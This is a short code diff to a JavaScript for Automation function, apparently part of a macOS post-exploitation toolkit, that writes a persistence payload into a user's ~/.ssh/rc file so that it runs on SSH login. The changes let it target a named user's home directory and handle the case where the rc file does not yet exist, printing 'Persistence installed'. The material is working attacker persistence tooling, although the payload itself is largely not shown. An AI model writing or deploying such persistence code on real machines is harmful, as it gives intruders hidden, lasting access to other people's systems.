@@ -1,4 +1,4 @@
-function SSHrc(persist, hiddenFiles) {
+function SSHrc(userName, persist, hiddenFiles) {
 
     ObjC.import('Foundation')
     ObjC.import("Cocoa");
@@ -6,7 +6,7 @@ function SSHrc(persist, hiddenFiles) {
     var app = Application.currentApplication();
     app.includeStandardAdditions = true;
 
-    var userHome = $.getenv('HOME')
+	var userHome = "/Users/" + userName
     var sysVers = app.systemInfo().systemVersion
     var output = ""
     try {
@@ -94,8 +94,19 @@ fi`
 
                 var updatedPayload = payload.replace(/payload/g, persist)
 
+				var rcFileexistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(profilePath)
+				
+        		if (rcFileexistsCheck == "false") {
+				
+				writeTextToFile(updatedPayload, profilePath, true)
+                output += "Persistence installed at " + userHome + '/.ssh/rc'
+				
+				} else {
+				
                 writeTextToFile(updatedPayload, profilePath, false)
                 output += "Persistence installed at " + userHome + '/.ssh/rc'
+				
+				}
             }
         
     } catch (error) {
